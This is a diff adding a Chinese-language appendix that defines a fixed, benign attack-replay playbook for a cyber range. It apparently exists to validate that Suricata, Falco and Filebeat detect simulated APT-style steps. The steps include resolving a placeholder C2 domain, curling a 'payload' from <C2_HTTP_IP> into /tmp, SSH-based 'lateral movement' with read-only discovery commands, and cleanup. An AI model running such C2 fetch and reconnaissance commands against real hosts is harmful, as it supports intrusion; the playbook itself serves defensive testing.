@@ -1,0 +1,256 @@
+\section{附录B：攻击场景与复现剧本}\label{appendix-b-attack-scenarios}
+
+\subsection{文档目的}\label{doc-purpose-22}
+
+本文件定义用于验收与演示的固定攻击复现剧本，明确每一步的动作、产生的证据类型、以及在系统中的预期可观测输出。
+
+本剧本不包含漏洞利用、提权、持久化、破坏性操作，仅用于生成可控证据并形成可讲述的``类 APT''链路。
+
+\subsection{读者对象}\label{target-audience-22}
+
+\begin{itemize}
+\tightlist
+\item
+  靶场负责人（负责复现与证据准备）
+\item
+  负责演示的同学（用于讲述与现场操作）
+\item
+  测试负责人（用于验收用例复用）
+\end{itemize}
+
+\subsection{引用关系}\label{references-22}
+
+\begin{itemize}
+\tightlist
+\item
+  运维与靶场：\texttt{../90-运维与靶场/91-靶场部署.md}、\texttt{../90-运维与靶场/92-一键编排.md}
+\item
+  C2 与证据点：\texttt{../90-运维与靶场/93-C2部署与证据点.md}
+\item
+  验收清单：\texttt{../90-运维与靶场/94-验证清单.md}
+\item
+  字段口径：\texttt{../80-规范/81-ECS字段规范.md}
+\end{itemize}
+
+\subsection{靶场角色与前置条件}\label{range-roles-prerequisites}
+
+\subsubsection{节点角色}\label{node-roles}
+
+本剧本使用以下节点角色（名称固定）：
+
+\begin{itemize}
+\tightlist
+\item
+  \texttt{center-01}：中心机
+\item
+  \texttt{client-01}：客户机实例 1
+\item
+  \texttt{client-02}：客户机实例 2
+\item
+  \texttt{client-03}：客户机实例 3
+\item
+  \texttt{client-04}：客户机实例 4
+\item
+  \texttt{c2-01}：命令与控制服务器
+\end{itemize}
+
+\subsubsection{前置条件}\label{prerequisites}
+
+\begin{enumerate}
+\def\labelenumi{\arabic{enumi}.}
+\tightlist
+\item
+  所有节点已按 \texttt{92-一键编排.md} 启动。
+\item
+  中心机注册表中可见 \texttt{client-01..04}。
+\item
+  客户机侧采集链路正常：Falco、Filebeat、Suricata 均在运行并能通过 Client API 拉取数据。
+\end{enumerate}
+
+\subsection{攻击链步骤（动作-证据-系统输出）}\label{attack-chain-steps}
+
+所有命令均在靶场宿主机 \texttt{\textless{}CENTER\_IP\textgreater{}} 上执行（不是在容器内执行）。
+
+\subsubsection{Step A C2 解析与连通}\label{step-a-c2-resolution}
+
+动作（固定命令）：
+
+\begin{verbatim}
+dig @<C2_DNS_IP> <C2_DOMAIN> +noall +answer +time=1 +tries=1
+curl -s http://<C2_HTTP_IP>/payload && echo
+\end{verbatim}
+
+预期证据（固定）：
+
+\begin{itemize}
+\tightlist
+\item
+  Suricata：出现 53 与 80 相关网络事件；DNS 事件中包含 \texttt{\textless{}C2\_DOMAIN\textgreater{}}；HTTP 事件中包含 \texttt{/payload}
+\end{itemize}
+
+系统预期输出（固定）：
+
+\begin{itemize}
+\tightlist
+\item
+  至少一个客户机实例的 \texttt{GET\ /suricata} 返回 \texttt{total\textgreater{}0}
+\end{itemize}
+
+\subsubsection{Step B 下载载荷到受害机}\label{step-b-payload-download}
+
+动作（固定命令）：
+
+\begin{verbatim}
+mkdir -p /tmp/apt-demo
+curl -s http://<C2_HTTP_IP>/payload -o /tmp/apt-demo/payload.txt
+sha256sum /tmp/apt-demo/payload.txt
+\end{verbatim}
+
+预期证据（固定）：
+
+\begin{itemize}
+\tightlist
+\item
+  Suricata：HTTP 请求 \texttt{/payload}
+\item
+  Falco：进程执行与文件写入（\texttt{curl} 写入 \texttt{/tmp/apt-demo/payload.txt}）
+\end{itemize}
+
+系统预期输出（固定）：
+
+\begin{itemize}
+\tightlist
+\item
+  至少一个客户机实例的 \texttt{GET\ /falco} 返回 \texttt{total\textgreater{}0}
+\item
+  至少一个客户机实例的 \texttt{GET\ /suricata} 返回 \texttt{total\textgreater{}0}
+\end{itemize}
+
+\subsubsection{Step C 执行良性脚本}\label{step-c-benign-script}
+
+动作（固定命令）：
+
+\begin{verbatim}
+cat > /tmp/apt-demo/run.sh <<'EOF'
+#!/usr/bin/env bash
+set -euo pipefail
+date
+echo "[demo] benign execution"
+echo "[demo] host=$(hostname) user=$(id -un)"
+EOF
+chmod +x /tmp/apt-demo/run.sh
+/tmp/apt-demo/run.sh | tee /tmp/apt-demo/output.log
+\end{verbatim}
+
+预期证据（固定）：
+
+\begin{itemize}
+\tightlist
+\item
+  Falco：\texttt{bash} 进程执行、创建与写入 \texttt{output.log}
+\end{itemize}
+
+系统预期输出（固定）：
+
+\begin{itemize}
+\tightlist
+\item
+  至少一个客户机实例的 \texttt{GET\ /falco} 返回 \texttt{total\textgreater{}0}
+\end{itemize}
+
+\subsubsection{Step D SSH 会话模拟横向移动}\label{step-d-ssh-lateral}
+
+动作（固定命令）：
+
+\begin{verbatim}
+ssh ubuntu@<CENTER_IP> "hostname; whoami; date"
+\end{verbatim}
+
+预期证据（固定）：
+
+\begin{itemize}
+\tightlist
+\item
+  Filebeat：采集到 SSH 登录与认证相关日志（Ubuntu 为 \texttt{/var/log/auth.log}）
+\end{itemize}
+
+系统预期输出（固定）：
+
+\begin{itemize}
+\tightlist
+\item
+  至少一个客户机实例的 \texttt{GET\ /filebeat} 返回 \texttt{total\textgreater{}0}
+\end{itemize}
+
+\subsubsection{Step E 只读发现与收集}\label{step-e-read-only-discovery}
+
+动作（固定命令）：
+
+\begin{verbatim}
+ssh ubuntu@<CENTER_IP> "ip -br a; ss -lntup | head; ls -la /tmp/apt-demo | head"
+\end{verbatim}
+
+预期证据（固定）：
+
+\begin{itemize}
+\tightlist
+\item
+  Filebeat：SSH 会话相关日志持续增长
+\item
+  Falco：只读探测行为与相关进程行为
+\end{itemize}
+
+系统预期输出（固定）：
+
+\begin{itemize}
+\tightlist
+\item
+  至少一个客户机实例的 \texttt{GET\ /filebeat} 返回 \texttt{total\textgreater{}0}
+\item
+  至少一个客户机实例的 \texttt{GET\ /falco} 返回 \texttt{total\textgreater{}0}
+\end{itemize}
+
+\subsubsection{Step F 清理回滚}\label{step-f-cleanup}
+
+动作（固定命令）：
+
+\begin{verbatim}
+rm -rf /tmp/apt-demo
+\end{verbatim}
+
+预期证据（固定）：
+
+\begin{itemize}
+\tightlist
+\item
+  Falco：删除目录与文件行为
+\end{itemize}
+
+系统预期输出（固定）：
+
+\begin{itemize}
+\tightlist
+\item
+  至少一个客户机实例的 \texttt{GET\ /falco} 返回 \texttt{total\textgreater{}0}
+\end{itemize}
+
+\subsection{复现后的验收关联（固定顺序）}\label{post-reproduction-acceptance}
+
+本剧本执行完成后，按以下顺序执行验收：
+
+\begin{enumerate}
+\def\labelenumi{\arabic{enumi}.}
+\tightlist
+\item
+  按 \texttt{../90-运维与靶场/94-验证清单.md} 验证采集与中心机入库
+\item
+  在中心机执行一次事件检索与告警检索：
+
+  \begin{itemize}
+  \tightlist
+  \item
+    \texttt{POST\ /api/v1/events/search}
+  \item
+    \texttt{POST\ /api/v1/findings/search}
+  \end{itemize}
+\end{enumerate}
